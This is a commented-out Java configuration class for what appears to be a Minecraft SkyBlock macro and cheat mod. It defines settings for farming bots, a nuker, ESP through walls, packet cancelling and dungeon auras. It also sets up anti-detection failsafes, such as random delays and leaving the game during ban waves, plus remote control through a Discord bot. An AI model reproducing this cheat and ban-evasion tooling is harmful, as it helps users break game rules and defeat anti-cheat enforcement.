/*package me.jacktym.aiomacro.config;

import cc.polyfrost.oneconfig.config.Config;
import cc.polyfrost.oneconfig.config.annotations.Button;
import cc.polyfrost.oneconfig.config.annotations.Checkbox;
import cc.polyfrost.oneconfig.config.annotations.Number;
import cc.polyfrost.oneconfig.config.annotations.*;
import cc.polyfrost.oneconfig.config.core.OneColor;
import cc.polyfrost.oneconfig.config.data.Mod;
import cc.polyfrost.oneconfig.config.data.ModType;
import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import me.jacktym.aiomacro.Main;
import me.jacktym.aiomacro.features.*;
import me.jacktym.aiomacro.gui.HUDLocationGui;
import me.jacktym.aiomacro.gui.TPSViewerGui;
import me.jacktym.aiomacro.rendering.LineRendering;
import me.jacktym.aiomacro.util.Utils;
import net.minecraft.client.Minecraft;
import net.minecraft.util.BlockPos;
import org.apache.commons.io.IOUtils;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.HttpClientBuilder;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.Random;

public class AIOMConfig extends Config {
    //Macro Settings
    public static AIOMConfig INSTANCE;
    public static boolean awaitShowColourWindow = false;
    @Dropdown(
            name = "Macro Type",
            //description = "Choose the macro you would like to use.",
            category = "Macro Settings",
            options = {"Netherwart/S-Shaped", "Sugarcane", "Nuker", "Bazaar Flipper", "Fairy Soul Aura", "Shiny Pig ESP", "Minion Aura", "Scatha Macro", "Carpentry Macro", "Auction Flipper", "Cocoa Bean"}
    )
    public static int macroType;
    @Slider(
            name = "Pitch",
            //description = "Sets the value you are looking up and down (Check f3).",
            category = "Macro Settings",
            min = -90,
            max = 90
    )
    public static int pitch;
    @Slider(
            name = "Yaw",
            //description = "Sets the value you are looking left to right (Check f3).",
            category = "Macro Settings",
            min = -180,
            max = 180
    )
    public static int yaw;
    @Switch(
            name = "Auto God Potion",
            //description = "Automatically buys and consumes a God Potion. (Requires gold in purse).",
            category = "Macro Settings"
    )
    public static boolean autoGodPotion;
    @Switch(
            name = "Auto Booster Cookie",
            //description = "Automatically buys and consumes a Booster Cookie. (Requires gold in purse).",
            category = "Macro Settings"
    )
    public static boolean autoCookie;
    @Switch(
            name = "Fast Break",
            //description = "Breaks crops at 40bps to allow for faster rancher boot speeds",
            category = "Macro Settings"
    )
    public static boolean fastBreak;
    @Dropdown(
            name = "Fast Break BPS",
            //description = "How many blocks per second (20 Ticks) Fast Break breaks.",
            category = "Macro Settings",
            options = {"20bps", "40bps", "60bps", "80bps"}
    )
    public static int fastBreakBPS;
    @Slider(
            name = "Auto Sell Minimum",
            //description = "The minimum amount of stacks to automatically sell (Cookie Only, 0 To Disable)",
            category = "Macro Settings",
            max = 10,
            min=0
    )
    public static int autoSellMinimum;
    @Switch(
            name = "Drop 180",
            //description = "Does a 180 turn after dropping during a farming macro",
            category = "Macro Settings"
    )
    public static boolean drop180;
    @Switch(
            name = "Ungrab",
            //description = "Ungrabs your mouse when using a farming macro",
            category = "Macro Settings"
    )
    public static boolean ungrab;
    //Failsafes
    @Switch(
            name = "Webhook Alerts",
            //description = "Sends webhook on failsafe, message, party invite, island visit, etc.",
            category = "Failsafes",
            subcategory = "Webhooks"
    )
    public static boolean webhookAlerts;
    @Slider(
            name = "Auto Webhook",
            //description = "How often to automatically send a webhook (0 to disable)",
            category = "Failsafes",
            max = 360,
            min=0
    )
    public static int autoWebhook = 0;
    @Text(
            name = "Webhook Link",
            //description = "Link to send webhook alerts to.",
            category = "Failsafes",
            subcategory = "Webhooks"
    )
    public static String webhookLink;
    @Slider(
            name = "Random Delay Minimum",
            //description = "The Minimum Random Delay (Milliseconds).",
            category = "Failsafes",
            min = 100,
            max = 5000
    )
    public static int randomDelayMin = 1000;
    @Slider(
            name = "Random Delay Maximum",
            //description = "The Maximum Random Delay (Milliseconds).",
            category = "Failsafes",
            min = 100,
            max = 5000
    )
    public static int randomDelayMax = 2000;
    @Slider(
            name = "Auto Disable",
            //description = "How long to farm until disabling (0 to disable)",
            category = "Failsafes",
            max = 360,
            min=0
    )
    public static int autoDisable = 0;
    @Dropdown(
            name = "Island Failsafe",
            //description = "Triggers when not on island.",
            category = "Failsafes",
            options = {"Stop Farming", "Teleport To Island", "Disable"}
    )
    public static int islandfailsafe;
    @Switch(
            name = "Jacob Failsafe",
            //description = "Stops farming during Jacob's contests.",
            category = "Failsafes"
    )
    public static boolean jacobfailsafe;
    @Switch(
            name = "Bedrock Failsafe",
            //description = "Stops farming when looking at bedrock.",
            category = "Failsafes"
    )
    public static boolean bedrockfailsafe;
    @Switch(
            name = "Set Spawn",
            //description = "Sets your island spawn after each row (Used to infinite farm when using teleport to island failsafe).",
            category = "Failsafes"
    )
    public static boolean setSpawnFailsafe;
    @Switch(
            name = "Play Sound",
            //description = "Plays a sound to alert you when a failsafe is triggered.",
            category = "Failsafes"
    )
    public static boolean soundfailsafe;
    @Switch(
            name = "AntiStuck",
            //description = "Detects when a player is stuck and attempts to unstick them.",
            category = "Failsafes"
    )
    public static boolean antiStuckFailsafe;
    @Switch(
            name = "AntiStuck Jump",
            //description = "Includes jumping in AntiStuck motion (helpful in some farms, unhelpful in others).",
            category = "Failsafes"
    )
    public static boolean antiStuckJump;
    @Switch(
            name = "Desync Failsafe",
            //description = "Detects when a player desyncs from farming and resyncs.",
            category = "Failsafes"
    )
    public static boolean desyncFailsafe;
    @Switch(
            name = "Banwave Failsafe",
            //description = "Detects when a banwave is in place, stops macroing, and leaves SkyBlock.",
            category = "Failsafes"
    )
    public static boolean banwaveFailsafe;
    @Number(
            name = "Minimum Bans",
            //description = "The minimum bans to trigger the banwave failsafe.",
            category = "Failsafes",
            min = 1,
            max = 5
    )
    public static int banWavePlayers = 3;

    //Farming HUD
    @Switch(
            name = "Toggle Farming HUD",
            //description = "Toggles showing of the Farming HUD.",
            category = "Farming HUD"
    )
    public static boolean farmingHUDOn;
    @Slider(
            name = "Farming HUD X",
            //description = "Sets the X value of farming hud.",
            category = "Farming HUD",
            max=4096,
            min=0
    )
    public static int farmingHUDX = 0;
    @Slider(
            name = "Farming HUD Y",
            //description = "Sets the Y value of farming hud.",
            category = "Farming HUD",
            max=4096,
            min=0
    )
    public static int farmingHUDY = 0;
    @Switch(
            name = "Total Profit",
            //description = "Displays how much profit you have made farming so far.",
            category = "Farming HUD",
            subcategory = "Profit"
    )
    public static boolean totalProfitHUD;
    @Switch(
            name = "Profit Per Hour",
            //description = "Displays how much profit you make every hour.",
            category = "Farming HUD",
            subcategory = "Profit"
    )
    public static boolean profitPerHourHUD;
    @Switch(
            name = "Profit Per 12 Hours",
            //description = "Displays how much profit you make every 12 hours.",
            category = "Farming HUD",
            subcategory = "Profit"
    )
    public static boolean profitPer12HoursHUD;
    @Switch(
            name = "Profit Per 24 Hours",
            //description = "Displays how much profit you make every 24 hours.",
            category = "Farming HUD",
            subcategory = "Profit"
    )
    public static boolean profitPer24HoursHUD;
    @Switch(
            name = "Crops Per Hour",
            //description = "Displays how many crops you yield in an hour.",
            category = "Farming HUD",
            subcategory = "Profit"
    )
    public static boolean cropsPerHourHUD;
    @Switch(
            name = "Total Final Crops Yielded",
            //description = "Displays how many final crop upgrades you yielded.",
            category = "Farming HUD",
            subcategory = "Statistics"
    )
    public static boolean totalFinalCropHUD;
    @Switch(
            name = "Mathematical Hoe Counter",
            //description = "Displays the counter on your mathematical hoe.",
            category = "Farming HUD",
            subcategory = "Statistics"
    )
    public static boolean hoeCounterHUD;
    @Switch(
            name = "God Potion Time",
            //description = "Displays time remaining on God Potion.",
            category = "Farming HUD",
            subcategory = "Failsafes"
    )
    public static boolean godPotionTimeHUD;
    @Switch(
            name = "Booster Cookie Time",
            //description = "Displays time remaining on Booster Cookie.",
            category = "Farming HUD",
            subcategory = "Failsafes"
    )
    public static boolean boosterCookieTimeHUD;
    @Switch(
            name = "Jacobs Farming Event Timers",
            //description = "Displays time until Jacob's Farming Event Starts/Ends.",
            category = "Farming HUD",
            subcategory = "Failsafes"
    )
    public static boolean jacobsEventHUD;
    @Switch(
            name = "Total Farming Time",
            //description = "Displays total time spent macroing.",
            category = "Farming HUD",
            subcategory = "Failsafes"
    )
    public static boolean farmingTime;
    @Color(
            name = "HUD Text Color",
            //description = "Sets the color for the HUD Text.",
            category = "Farming HUD",
            subcategory = "Color"
    )
    public static OneColor hudColor = new OneColor(255,255,255);

    @Button(
            text="Click Me!",
            name = "Change Farming HUD Position",
            //description = "Changes the position of the Farming HUD.",
            category = "Farming HUD"
    )
    public final void changeFarmingHUD() {
        Minecraft.getMinecraft().displayGuiScreen(new HUDLocationGui());
    }

    @Button(
            text="Click Me!",
            name = "Reset Farming HUD Position",
            //description = "Resets the position of the Farming HUD.",
            category = "Farming HUD"
    )
    public final void resetFarmingHUD() {
        farmingHUDX = 0;
        farmingHUDY = 0;
    }

    //Nuker
    @Dropdown(
            name = "Nuker Block",
            //description = "Chooses the block to be nuked.",
            category = "Nuker",
            options = {"Mycelium", "Red Sand", "Wood", "Any Crop But Cane / Cactus", "Cane/Cactus", "Hoe Plow", "Custom Nuker"}
    )
    public static int nukerBlock;
    @Text(
            name = "Custom Nuker Block",
            //description = "A custom block name to nuke.",
            category = "Nuker"
    )
    public static String customNukerBlock = "";
    @Checkbox(
            name = "Stay on Y Level",
            //description = "Does not mine any blocks below your y level",
            category = "Nuker"
    )
    public static boolean stayOnYLevel = false;
    @Dropdown(
            name = "Nuker BPS",
            //description = "How many blocks per second (20 Ticks) Nuker breaks.",
            category = "Nuker",
            options = {"20bps", "40bps", "60bps", "80bps"}
    )
    public static int nukerBPS;
    @Color(
            name = "Next Block Color",
            //description = "Sets the color displayed on the next nuked block.",
            category = "Nuker"
    )
    public static OneColor nukerColor = new OneColor(255,0,0);


    //Debugging
    @Switch(
            name = "Developer Mode",
            //description = "Used to print to the logs to debug.",
            category = "Debugging"
    )
    public static boolean devmode;
    @Slider(
            name = "Turn Speed",
            //description = "How fast you turn",
            category = "Debugging",
            min = 1,
            max = 50
    )
    public static int turnSpeed = 10;
    @Dropdown(
            name = "Auto Wheat Phase",
            //description = "Sets what phase to start the auto wheat on",
            category = "Debugging",
            subcategory = "Auto Wheat",
            options = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30"}
    )
    public static int autoWheatPhase;
    @Checkbox(
            name = "Auto Wheat Private Lobby Mode",
            //description = "Instead of using private lobbies, switches between private ones (requires rank) [WIP!!!]",
            category = "Debugging",
            subcategory = "Auto Wheat"
    )
    public static boolean autoWheatPrivate;
    //Bazaar Flipper
    @Text(
            name = "Bazaar Flipper Max Orders",
            //description = "The max orders the bot will place.",
            category = "Bazaar Flipper"
    )
    public static String maxFlips = "6";
    //Cane Builder
    @Number(
            name = "Cane Builder Layers",
            //description = "How many layers to build",
            category = "Cane Builder",
            min = 1,
            max = 9
    )
    public static int caneBuilderLayers = 1;
    @Dropdown(
            name = "Cane Builder Phase",
            //description = "Sets what phase to start the cane builder on",
            category = "Cane Builder",
            subcategory = "Debug",
            options = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30"}
    )
    public static int caneBuilderPhase;
    @Dropdown(
            name = "Crop Aura BPS",
            //description = "How many blocks per second (20 Ticks) Crop Aura places.",
            category = "Cane Builder",
            options = {"20bps", "40bps", "60bps", "80bps"}
    )
    public static int cropAuraBPS;

    public AIOMConfig() {
        super(new Mod("AIO-Macro Config", ModType.SKYBLOCK), "Config.json");
        System.out.println("Config Init!!");

        initialize();
    }

    public static List<String> getBazaarBlacklist() {
        List<String> blacklistBazaar = new ArrayList<>();
        if (blackListItems.contains(",")) {
            for (String item : blackListItems.split(",")) {
                if (BazaarFlipper.apiToGame.containsValue(item)) {
                    blacklistBazaar.add(item);
                } else {
                    System.out.println("[AIOM] Error! " + item + " Not Found! Please check spelling and capitalization!");
                }
            }
        } else if (!blackListItems.equals("")) {
            if (BazaarFlipper.apiToGame.containsValue(blackListItems)) {
                blacklistBazaar.add(blackListItems);
            } else {
                System.out.println("[AIOM] Error! " + blackListItems + " Not Found! Please check spelling and capitalization!");
            }
        }
        return blacklistBazaar;
    }

    @Button(
            name = "Macro On",
            //description = "Toggles the macro on and off",
            text = "Toggle!",
            category = "Macro Settings"
    )
    public final void macroToggle() {
        MacroHandler.toggleMacro();
    }

    @Checkbox(
            name = "Auto Combine Same Books",
            //description = "Combines same books when in an anvil.",
            category = "Macro Settings"
    )
    public static boolean autoCombineBooks = false;

    @Checkbox(
            name = "Auto Combine Rune",
            //description = "Combines same runes when in a rune pedestal.",
            category = "Macro Settings"
    )
    public static boolean autoCombineRunes = false;

    @Checkbox(
            name = "Auto Jerry Box",
            //description = "Automatically uses jerry boxes in your hot bar.",
            category = "Macro Settings"
    )
    public static boolean autoJerryBox = false;

    //Account Linking
    @Text(
            name = "AIOM Linking Code",
            //description = "Get in the AIOM Discord by running /link",
            category = "Account Linking"
    )
    public static String linkCode = "";

    @Button(
            text="Click Me!",
            name = "Test Look Omg!?!?",
            //description = "Epic Gamering.",
            category = "Debugging"
    )
    public final void toggleTestLook() {
        SetPlayerLook.setDefault();

        SetPlayerLook.toggled = !SetPlayerLook.toggled;
    }

    @Button(
            text="Click Me!",
            name = "Show Block Pos Omg!?!?",
            //description = "Epic Gamering.",
            category = "Debugging"
    )
    public final void toggleBlockPos() {
        AutoBazaarUnlocker.showBlockPos = !AutoBazaarUnlocker.showBlockPos;
    }

    @Button(
            text="Click Me!",
            name = "Toggle Cane Builder",
            //description = "Omg Free Money",
            category = "Cane Builder"
    )
    public final void toggleCaneBuilder() {

        CaneBuilder.phase = caneBuilderPhase;

        CaneBuilder.startY = Main.mcPlayer.posY;

        CaneBuilder.startZ = new BlockPos(Main.mcPlayer.posX, Main.mcPlayer.posY - 1, Main.mcPlayer.posZ).getZ();

        CaneBuilder.west = (0 < Main.mcPlayer.posX);

        CaneBuilder.caneBuilderOn = !CaneBuilder.caneBuilderOn;

        SetPlayerLook.toggled = CaneBuilder.caneBuilderOn;

    }

    @Button(
            text="Click Me!",
            name = "Crop Aura Toggle",
            //description = "Epic Gamering.",
            category = "Cane Builder"
    )
    public final void toggleCropAura() {
        CropAura.toggled = !CropAura.toggled;
    }

    @Text(
            name = "Bazaar Flipper Min Price",
            //description = "The minimum price of an item to order it (0 To Disable).",
            category = "Bazaar Flipper"
    )
    public static String minPrice = "1000";
    @Text(
            name = "Bazaar Flipper Max Price",
            //description = "The maximum price of an item to order it (0 To Disable).",
            category = "Bazaar Flipper"
    )
    public static String maxPrice = "1000000";
    @Text(
            name = "Bazaar Flipper Min Margin",
            //description = "The minimum margin of an item to order it (0 To Disable).",
            category = "Bazaar Flipper"
    )
    public static String minMargin = "50000";
    @Text(
            name = "Bazaar Flipper Max Margin",
            //description = "The maximum margin of an item to order it stopping manipulations and api bugs (0 To Disable).",
            category = "Bazaar Flipper"
    )
    public static String maxMargin = "500000";
    @Text(
            name = "Bazaar Flipper Min Volume",
            //description = "The minimum volume of an item to order it (0 To Disable).",
            category = "Bazaar Flipper"
    )
    public static String minVolume = "500000";
    @Text(
            name = "Bazaar Flipper Max Volume",
            //description = "The maximum volume of an item to order it (0 To Disable).",
            category = "Bazaar Flipper"
    )
    public static String maxVolume = "0";
    @Text(
            name = "Blacklist",
            //description = "Items to blacklist when flipping",
            category = "Bazaar Flipper"
    )
    public static String blackListItems = "❁ Perfect Jasper Gemstone,Enchanted Cobblestone";
    @Checkbox(
            name = "Developer Mode",
            //description = "Helps with debugging",
            category = "Bazaar Flipper"
    )
    public static boolean bazaarFlipDevMode = false;
    @Checkbox(
            name = "NPC Mode",
            //description = "Clicks the Bazaar NPC Rather than using /bz",
            category = "Bazaar Flipper"
    )
    public static boolean bazaarFlipNpcMode = false;
    @Slider(
            name = "Tick Delay",
            //description = "Test for tick delay",
            category = "Bazaar Flipper",
            min = 1,
            max = 100
    )
    public static int bazaarFlipDelay = 20;

    @Button(
            text="Click Me!",
            name = "Auto Wheat Omg!?!?",
            //description = "Epic Gamering.",
            category = "Debugging",
            subcategory = "Auto Wheat"
    )
    public final void toggleAutoWheat() {
        AutoBazaarUnlocker.autoWheatOn = !AutoBazaarUnlocker.autoWheatOn;

        AutoBazaarUnlocker.phase = autoWheatPhase;

        SetPlayerLook.toggled = false;
    }

    @Checkbox(
            name = "Remote Controlling",
            //description = "Allows your account to be controlled remotely via the discord bot (Only through a linked account)",
            category = "Account Linking"
    )
    public static boolean remoteControllingOn = true;
    @Switch(
            name = "Enable Rendering",
            //description = "Disables all rendering, can be used to fix rendering bugs.",
            category = "Rendering"
    )
    public static boolean renderingEnabled = true;

    @Slider(
            name = "Path Recording Points Per Block",
            //description = "How many points per block the path recorder records. More points = more data = smoother",
            category = "Rendering",
            subcategory = "Path Recording",
            min = 1,
            max = 10
    )
    public static int pointsPerBlock = 1;

    @Button(
            text="Click Me!",
            name = "Clear Recorded Paths",
            //description = "Deletes current path recording",
            category = "Rendering",
            subcategory = "Path Recording"
    )
    public final void clearPaths() {
        LineRendering.lastPos = null;
        LineRendering.glCapMap.clear();
        LineRendering.currentRenderPoints.clear();
    }

    @Button(
            name = "Test Webhook",
            //description = "Sends a test message to the webhook provided.",
            text = "Send!",
            category = "Failsafes",
            subcategory = "Webhooks"
    )
    public final void testWebhook() {

        String screenshotLink = Objects.requireNonNull(Utils.takeScreenshot()).replace("\"", "");

        String jsonString = "{\"content\":null,\"embeds\":[{\"title\":\"Test Message | No Actions Done\",\"description\":\"A webhook test was requested. No\\nactions were taken.\\n\\nAccount: " + Main.mcPlayer.getName() + "\",\"color\":5814783,\"author\":{\"name\":\"AIO-Macro\"},\"image\":{\"url\":\"" + screenshotLink + "\"}}]}\n";

        String trimmed = jsonString.trim();

        JsonParser parser = new JsonParser();

        JsonElement jsonElement = parser.parse(trimmed);

        Utils.sendWebhook(jsonElement, AIOMVigilanceConfig.webhookLink);

    }

    @Button(
            text="Click Me!",
            name = "Link Account",
            //description = "Links your Discord account to your Minecraft using the link code",
            category = "Account Linking"
    )
    public final void link() {
        sendRequest("{\"content\":null,\"embeds\":[{\"title\":\"Account Link Request\",\"description\":\"" + linkCode + ":" + Main.mcPlayer.getGameProfile().getId().toString() + "\"}]}\n");
    }

    @Button(
            text="Click Me!",
            name = "Unlink Account",
            //description = "Unlinks your Discord account from your Minecraft",
            category = "Account Linking"
    )
    public final void unlink() {
        sendRequest("{\"content\":null,\"embeds\":[{\"title\":\"Account Unlink Request\",\"description\":\"" + linkCode + ":" + Main.mcPlayer.getGameProfile().getId().toString() + "\"}]}\n");
    }

    @Checkbox(
            name = "Auto Reopen AH",
            //description = "Automatically reopens the Auction House when buying an item. (Useful for spam buying items to flip)",
            category = "Quality Of Life",
            subcategory = "Auctions"
    )
    public static boolean autoReopenAh = false;

    @Checkbox(
            name = "Auction House Search Extension",
            //description = "Enables the AH Search Extension to find specific items easier.",
            category = "Quality Of Life",
            subcategory = "Auctions"
    )
    public static boolean ahSearchExtension = false;
    @Checkbox(
            name = "Auction House Re-skin",
            //description = "Re-skins the Auction House.",
            category = "Quality Of Life",
            subcategory = "Auctions"
    )
    public static boolean ahReSkin = false;
    @Text(
            name = "Saved HotBar Data",
            //description = "WARNING: Do Not Edit! Editing Can Cause Unwanted Effects!",
            category = "Quality Of Life",
            subcategory = "Automatic HotBar"
    )
    public static String hotBarData = "";
    @Text(
            name = "HotBar Profile One",
            //description = "The EXACT name of the hotbar profile (saved with /aiom hotbar save {name} and find through /aiom hotbar list).",
            category = "Quality Of Life",
            subcategory = "Automatic HotBar"
    )
    public static String hotBarProfileOne = "";
    @Text(
            name = "HotBar Profile Two",
            //description = "The EXACT name of the hotbar profile (saved with /aiom hotbar save {name} and find through /aiom hotbar list).",
            category = "Quality Of Life",
            subcategory = "Automatic HotBar"
    )
    public static String hotBarProfileTwo = "";
    @Text(
            name = "HotBar Profile Three",
            //description = "The EXACT name of the hotbar profile (saved with /aiom hotbar save {name} and find through /aiom hotbar list).",
            category = "Quality Of Life",
            subcategory = "Automatic HotBar"
    )
    public static String hotBarProfileThree = "";
    @Text(
            name = "Automatic Floor 7 Callout | Crystal Phase / P1",
            //description = "The text to automatically callout when entering Phase 1 of the Floor 7 Boss Fight",
            category = "Quality Of Life",
            subcategory = "Auto F7 Callouts"
    )
    public static String autoF7CalloutPhase1 = "";
    @Text(
            name = "Automatic Floor 7 Callout | Crusher Phase / P2",
            //description = "The text to automatically callout when entering Phase 2 of the Floor 7 Boss Fight",
            category = "Quality Of Life",
            subcategory = "Auto F7 Callouts"
    )
    public static String autoF7CalloutPhase2 = "";
    @Text(
            name = "Automatic Floor 7 Callout | Terminal Phase / P3",
            //description = "The text to automatically callout when entering Phase 3 of the Floor 7 Boss Fight",
            category = "Quality Of Life",
            subcategory = "Auto F7 Callouts"
    )
    public static String autoF7CalloutPhase3 = "";
    @Text(
            name = "Automatic Floor 7 Callout | Final Phase / P4",
            //description = "The text to automatically callout when entering Phase 4 of the Floor 7 Boss Fight",
            category = "Quality Of Life",
            subcategory = "Auto F7 Callouts"
    )
    public static String autoF7CalloutPhase4 = "";

    /*@Checkbox(
            name = "Skyblock AntiKB",
            //description = "Toggles AntiKB Inside of SkyBlock (Disabled when holding jerry-chine [vertical only], bonzo staff, or grappling hook",
            category = "Quality Of Life"
    )
    public static boolean antiKB = false;*//*
    @Text(
            name = "KeyBind VerticalClip Amount",
            //description = "Changes the clip amount of VClip on the KeyBind",
            category = "Quality Of Life",
            subcategory = "VerticalClip"
    )
    public static String vClipKeyBindAmount = "";
    @Text(
            name = "KeyBind HorizontalClip Amount",
            //description = "Changes the clip amount of HClip on the KeyBind",
            category = "Quality Of Life",
            subcategory = "HorizontalClip"
    )
    public static String hClipKeyBindAmount = "";
    @Switch(
            name = "Crypt ESP",
            //description = "Highlights crypts in dungeons",
            category = "Quality Of Life",
            subcategory = "ESP"
    )
    public static boolean cryptESPOn = false;
    @Color(
            name = "ESP Color",
            //description = "The color of the ESP outline",
            category = "Quality Of Life",
            subcategory = "ESP"
    )
    public static OneColor dungeonESPColor = new OneColor(255,255,255);
    @Switch(
            name = "Dungeon Door Aura",
            //description = "Automatically clicks on wither/blood doors in range of the player",
            category = "Quality Of Life"
    )
    public static boolean dungeonDoorAura = false;
    @Switch(
            name = "Water Puzzle Aura",
            //description = "Auto solves water, provided you follow the instructions",
            category = "Quality Of Life",
            subcategory = "Dungeon Solvers"
    )
    public static boolean waterToggled = false;
    @Slider(
            name = "Water Duration",
            //description = "The amount of water that is allowed to flow- adjust based on ping etc. (NOT IN SECONDS.) \n DO NOT CHANGE THIS MID SOLVE, IT WILL BREAK. CHANGE THIS BEFORE A RUN OR DURING AN UNSOLVED GATE.",
            category = "Quality Of Life",
            subcategory = "Dungeon Solvers",
            min = 2,
            max = 5
    )
    public static int waterDuration = 2;

    @Checkbox(
            name = "Username Hider",
            //description = "Hides your actual username anywhere it is displayed.",
            category = "Quality Of Life",
            subcategory = "Username Hider"
    )
    public static boolean usernameHider = false;

    @Text(
            name = "Username Replacement",
            //description = "What your username is replaced with when username hider is enabled",
            category = "Quality Of Life",
            subcategory = "Username Hider"
    )
    public static String usernameReplacement = "";

    @Checkbox(
            name = "Hide Summons",
            //description = "Stops summoned mobs from rendering 10+ blocks away.",
            category = "Quality Of Life"
    )
    public static boolean hideSummons = false;

    @Checkbox(
            name = "Auto Close Chest",
            //description = "Automatically closes dungeon chests",
            category = "Quality Of Life"
    )
    public static boolean autoCloseChest = false;

    @Checkbox(
            name = "Auto Salvage",
            //description = "Automatically salvages bad dungeon items",
            category = "Quality Of Life"
    )
    public static boolean autoSalvage = false;


    @Checkbox(
            name = "TPS Viewer",
            //description = "Shows the current server TPS",
            category = "TPS Viewer"
    )
    public static boolean tpsViewer = false;

    @Button(
            text="Click Me!",
            name = "Change Location",
            //description = "Sets the Server TPS HUD Location",
            category = "TPS Viewer"
    )
    public static void tpsViewer() {
        Minecraft.getMinecraft().displayGuiScreen(new TPSViewerGui());
    }

    @Color(
            name = "TPS Viewer Color",
            //description = "Sets the Server TPS Text Color",
            category = "TPS Viewer"
    )
    public static OneColor tpsViewerColor = new OneColor(0,0,255);

    @Slider(
            name = "TPS Viewer X",
            //description = "Sets the X value of tps viewer.",
            category = "TPS Viewer",
            max=3096,
            min=0
    )
    public static int tpsViewerX = 0;

    @Slider(
            name = "TPS Viewer Y",
            //description = "Sets the Y value of tps viewer.",
            category = "TPS Viewer",
            max=3096,
            min=0
    )
    public static int tpsViewerY = 0;

    @Checkbox(
            name = "Dungeon Mob ESP",
            //description = "Shows starred mobs, bats, fels, mini-bosses, through walls.",
            category = "ESP"
    )
    public static boolean dungeonMobESP = false;

    @Checkbox(
            name = "Slayer Boss ESP",
            //description = "Shows slayer minibosses and bosses through walls.",
            category = "ESP"
    )
    public static boolean slayerBossESP = false;

    @Checkbox(
            name = "Show Hidden Mobs",
            //description = "Shows invisible mobs like fels, shadow assassins, blood mobs, ghosts.",
            category = "ESP"
    )
    public static boolean showHiddenMobs = false;

    @Checkbox(
            name = "Crystal Hollows ESP",
            //description = "Shows Corleone, Team Treasurite, Automaton, Goblins, Sludges, Yog, Bal, and Butterflies through walls.",
            category = "ESP"
    )
    public static boolean miningESP = false;

    @Color(
            name = "ESP Color",
            //description = "Sets the ESP Outline Color",
            category = "ESP"
    )
    public static OneColor ESPColor = new OneColor(0,0,255);

    @Number(
            name = "ESP Color",
            //description = "Sets the ESP Outline Color",
            category = "ESP",
            min = 1,
            max = 20
    )
    public static int ESPSize = 10;

    @Checkbox(
            name = "Diana Waypoints On",
            //description = "Enables Diana Waypoints",
            category = "Diana"
    )
    public static boolean waypointsOn = false;
    @Checkbox(
            name = "Diana Show Guess",
            //description = "Enables Diana Waypoint Guesses",
            category = "Diana"
    )
    public static boolean guessWaypointsOn = false;
    @Checkbox(
            name = "Enable Burrow Aura",
            //description = "Enables Burrow Aura",
            category = "Diana"
    )
    public static boolean burrowEnabled = false;
    @Checkbox(
            name = "Use Echo After Burrow",
            //description = "Uses the Echo ability after uncovering a burrow",
            category = "Diana"
    )
    public static boolean useEchoAfterBurrow = false;

    @Number(
            name = "Carpentry Backpack Slot",
            //description = "Selects the backpack slot that the carpentry macro outputs diamond blocks to.",
            category = "Carpentry",
            min = 1,
            max = 16
    )
    public static int carpentryMacroSlot = 1;

    @Slider(
            name = "Carpentry Tick Rate",
            //description = "Changes the carpentry macro speed.",
            category = "Carpentry",
            min = 10,
            max = 200
    )
    public static int carpentryMacroSpeed = 100;

    @Switch(
            name = "Auto Ready",
            //description = "DEV: auto ready for kuudra testing",
            category = "Kuudra",
            subcategory = "Settings"
    )
    public static boolean autoReady = false;

    @Switch(
            name = "Auto Aim",
            //description = "Auto Aims at the Kuudra withers (I think broken fixed soon tm?)",
            category = "Kuudra",
            subcategory = "Settings"
    )
    public static boolean autoAim = false;


    @Checkbox(
            name = "Toggle Cancelling",
            //description = "Toggles the cancelling of packets.",
            category = "Packets"
    )
    public static boolean cancelPackets = false;
    @Checkbox(
            name = "Cancel C0APacketAnimation",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C0APacketAnimation = false;
    @Checkbox(
            name = "Cancel C0BPacketEntityAction",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C0BPacketEntityAction = false;
    @Checkbox(
            name = "Cancel C0CPacketInput",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C0CPacketInput = false;
    @Checkbox(
            name = "Cancel C0DPacketCloseWindow",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C0DPacketCloseWindow = false;
    @Checkbox(
            name = "Cancel C0EPacketClickWindow",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C0EPacketClickWindow = false;
    @Checkbox(
            name = "Cancel C0FPacketConfirmTransaction",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C0FPacketConfirmTransaction = false;
    @Checkbox(
            name = "Cancel C00PacketKeepAlive",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C00PacketKeepAlive = false;
    @Checkbox(
            name = "Cancel C01PacketChatMessage",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C01PacketChatMessage = false;
    @Checkbox(
            name = "Cancel C02PacketUseEntity",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C02PacketUseEntity = false;
    @Checkbox(
            name = "Cancel C03PacketPlayer",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C03PacketPlayer = false;
    @Checkbox(
            name = "Cancel C07PacketPlayerDigging",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C07PacketPlayerDigging = false;
    @Checkbox(
            name = "Cancel C08PacketPlayerBlockPlacement",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
